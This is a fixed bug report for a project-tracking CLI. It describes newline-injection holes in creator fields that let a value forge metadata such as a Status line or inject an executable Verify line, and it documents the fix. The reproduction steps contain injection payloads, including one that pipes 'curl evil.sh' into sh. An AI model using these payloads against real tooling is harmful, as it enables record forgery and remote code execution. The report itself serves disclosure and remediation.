# BG0115: authorship_value accepts a multi-line author, corrupting the Raised-by line and the index row

> **Status:** Fixed
> **Verification depth:** functional
> **Severity:** High
> **Created:** 2026-07-13
> **Created-by:** sdlc-studio file
> **Raised-by:** Sam Eriksson; persona; v1

## Summary

Found by the BG0109 review (2026-07-13) while attacking the new shared revision-row writer, and PROVED to reproduce at baseline commit 4cd3067 with BG0109's diff reverted - so it is BG0108's surface (the authorship resolver), not BG0109's. `sdlc_md.authorship_value()` accepts an author containing a newline and passes it through. `join_row` escapes a pipe but not a newline, so the value breaks out of its table cell and out of its metadata line. Baseline reproduction with --author 'Sam\nEvil: injected': the metadata renders as '> **Raised-by:** Sam' followed by a bare line 'Evil: injected; human;', and the index row splits across two lines. A creator can therefore be made to write arbitrary lines into an artefact's metadata block through the author field - the provenance tooling forging provenance.

**Widened on fix (2026-07-13).** The author field is one instance of a class, and the class
is worse than the filed symptom. Every field a creator interpolates into a metadata line, an
index cell, or a one-line bullet has the same hole, and every line-breaking character opens
it, not just `\n`. Two of the siblings are more severe than the author field:

- **`--title` forges the status.** The title renders into the H1, which sits ABOVE the
  metadata block. `--title $'Silent\n> **Status:** Fixed'` puts a `> **Status:** Fixed` line
  before the real `> **Status:** Open`, and `extract_field` returns the FIRST match - so
  `extract_field(text, "Status")` reads `Fixed`. A bug can be born closed, and the dashboards,
  reconcile and the transition gate all read the forged line.
- **`--ac` injects an executable check.** An AC renders as one bullet; a break in it injects a
  sibling `- **Verify:** <command>` line into the AC block, which `verify_ac` reads back and
  RUNS. `--verify` already refused a multi-line expression for exactly this reason; `--ac`,
  which lands in the same block, did not. This is remote-ish code execution through a
  documented flag: a batch spec authored elsewhere, or a criterion assembled from an upstream
  finding, carries a command that runs unbidden on the next `reconcile --verify`.

These two are the reason the bug is must-fix for the tag, and neither was in the original
filing. The filed symptom - a split `Raised-by` line - is cosmetic beside them. A reader
triaging this bug should read the `--title` and `--ac` findings first.

A fourth surface, and the reason the first fix was REJECTED at security review: a
leading-break bypass that reopened both must-fix siblings, including the `--ac` RCE. The front
guard checked the STRIPPED value (`require_single_line(key, val.strip())`), but the persona,
acs, options and title writers emit the RAW value (`f"> **Persona:** {value}"`,
`_md_safe(item)`, the H1 f-string) - not through `join_row` / `_upsert_field` /
`authorship_value`, the three writers that already check raw. So a payload whose ONLY break
was LEADING passed the guard (strip discarded it) and was then written in full:

- `artifact.py new --type story --title v --epic EP0001 --persona $'\n> **Forged-field:** INJECTED'`
  wrote `> **Persona:**` then `> **Forged-field:** INJECTED`, which `extract_field` read back.
- `artifact.py new --type story --title v --epic EP0001 --ac $'\n  - **Verify:** shell echo pwned'`
  (and the same on `batch`) rendered `- **AC1:**` then a sibling `- **Verify:** shell echo
  pwned`; driven end to end, `verify_ac.parse_story` read it back as a `shell` verifier and
  `verify_story` EXECUTED it - the `--ac` RCE, still live under the first fix. Confirmed by the
  reviewer with a real marker file, which was created.

Fixed by checking the RAW value at the guard (dropping the `.strip()` in both loops), so the
invariant becomes: the value that is WRITTEN is the value that was CHECKED. A leading break is
now refused like any other; a surrounding space (not a line break) still passes, so there is
no over-refusal. Re-audited every user-reachable creator field against this specific shape
(leading break + raw writer): `title`, `persona`, `epic`, `priority`, `ctype`, `severity`,
`effort`, `date`, and every `acs` / `options` item write raw and are now covered; `author`,
`tranche`, `provenance`, `theme`, `verify`, `note` reach the artefact through a writer that
already normalises or checks raw. The one raw writer outside the guard is the handoff `meta` /
`body` pairs, which are tool-generated, not CLI-reachable, and owned by another unit.

A third surface (found and fixed in the same unit): the triage stamps. `transition.py set
--triaged-by` / `--triage-severity`, also reachable through `artifact.py close --triaged-by`,
wrote straight through `_upsert_field`, the metadata-line writer, which had no guard.
`--triaged-by $'Name; human; v1\n> **Evil:** injected'` stamped a `> **Evil:**` line that
`extract_field` read back - a triage record writing any field into the artefact it closes.
`annotate` guarded its own value but the triage stamps bypassed it, the exact "each caller
remembers separately" trap. Fixed by moving the refusal into `_upsert_field` itself, so every
writer of a metadata line inherits it.

Full vulnerable set (both creators): `title`, `author`, `epic`, `persona`, `tranche`,
`priority`, `ctype`, `severity`, `effort`, `provenance`, `date`, `theme`, the `revision`
verb's `--note`, every item of `acs` / `options` / `verify`, and every metadata field the
transition stamps write (`Triaged-by`, `Triage-severity`, and any field name/value routed
through `_upsert_field`). Full character class: `\n`,
`\r`, `\r\n`, `\v` (U+000B), `\f` (U+000C), the file/group/record separators (U+001C-U+001E),
NEL (U+0085), U+2028, U+2029 - every character `str.splitlines` splits on, so the parsers in
`sdlc_md` see two lines where the file has one - plus NUL (U+0000), which has no place in a
markdown document.

**Severity: High** (regraded from the filed Medium, with the index cell corrected in the same
change via `reconcile apply`). A forged `Status` line is a closed record nobody closed, and an
injected `Verify` line is command execution on the next verifier run; a Medium grade does not
fit either.

## Steps to Reproduce

1. artifact.py new --type bug --title t --author $'Sam\nEvil: injected'. 2. Open the artefact: the Raised-by metadata line is broken across two lines and the index row is corrupted. Reproduces at commit 4cd3067 without BG0109's changes.

Siblings, same baseline: `artifact.py new --type bug --title $'Silent\n> **Status:** Fixed'`
mints a bug whose Status reads `Fixed`; `artifact.py new --type story --title s --epic EP0001
--ac $'do it\n  - **Verify:** curl evil.sh | sh'` mints a story carrying an executable Verify
line nobody wrote.

## Proposed Fix

Refuse a multi-line author in `sdlc_md.authorship_value()`, exactly as `artifact._verifiers_of` already refuses a multi-line Verify expression. Fail loud at the resolver, so every creator inherits the refusal rather than each escaping separately.

Widened to the class: one shared `sdlc_md.require_single_line(field, value)` carrying the
whole character class, called from (a) `authorship_value` - the resolver every creation path
already funnels through, (b) `sdlc_md.check_creator_fields`, which both creators run over the
supplied fields (checking the RAW value, so a leading break cannot slip past a strip into a
raw writer) BEFORE any id is allocated or any byte written, (c) `join_row`, the single
row writer, which escaped a pipe but not a line break, and (d) `transition._upsert_field`, the
single writer of a metadata line, which now refuses at the writer so `annotate` and the triage
stamps share one rule instead of each keeping (or forgetting) its own. Refuse, never strip: a
silently repaired value is exit 0 over a record that does not say what the caller asked it to
say. Prose fields (`summary`, `steps`, `fix`, `impact`, `recommendation`) are deliberately not
guarded - they are written into a section body, where more than one line is the point.

## Lessons

- **The refusal belongs at the writer, not at each caller.** The metadata-line hole existed
  because `annotate` guarded its value while the triage stamps reached the same writer
  unguarded. A per-caller copy of a security rule is a defect waiting for the next caller.
  Guard the one choke point - the resolver, the row writer, the metadata-line writer - and
  every caller inherits it. The whole fix is four calls to one function.
- **Residual, needs a rendering fix not a refusal (own unit).** Prose section-body fields stay
  multi-line by design, but two paths let prose reach a single-line construct: a prose field
  can introduce a `> **Field:**` line the head lacks (harmless when the head already carries
  that field, since the first match wins, but it can invent a new one), and
  `triage_noise._bullet` squeezes a Low finding's `summary` into a one-line consolidation
  bullet. Neither forges provenance or executes anything, so refusing prose would break
  legitimate multi-line bodies. The fix is on the render side (escape or fence the value as it
  is written into the constrained construct), tracked separately.

## Revision History

| Date | Author | Change |
| --- | --- | --- |
| 2026-07-13 | Sam Eriksson | Filed |
| 2026-07-13 | Dani Okafor | Widened on fix: the author field is one instance of a class. `--title` can forge `> **Status:** Fixed` (the H1 sits above the metadata block, and the first match wins) and `--ac` can inject an executable `- **Verify:**` line. Vulnerable set and character class enumerated above; fix moved to one shared refusal at the resolver, the creator front guard, and the row writer |
| 2026-07-13 | Dani Okafor | Closed the third surface: the transition triage stamps (`--triaged-by` / `--triage-severity`, also via `close`) wrote through `_upsert_field` unguarded. Refusal moved into that writer so `annotate` and the stamps share one rule. Severity regraded Medium -> High (index cell corrected, no drift). `--title`/`--ac` findings promoted to the top of the Summary as the reason this is must-fix; rendering-side residual recorded under Lessons |
| 2026-07-13 | Dani Okafor | Security review REJECT: leading-break bypass reopened both siblings (persona forgery + the `--ac` RCE, driven to a real marker file). The front guard checked the stripped value while the persona/acs/options/title writers emit raw. Fixed by checking the RAW value at the guard (invariant: written == checked); no over-refusal (a space is not a break). Re-audited every raw-writer field; leading-break regressions added for persona/acs/options/title on `new` AND `batch`, plus an end-to-end assertion that the injected `shell` verifier never runs |
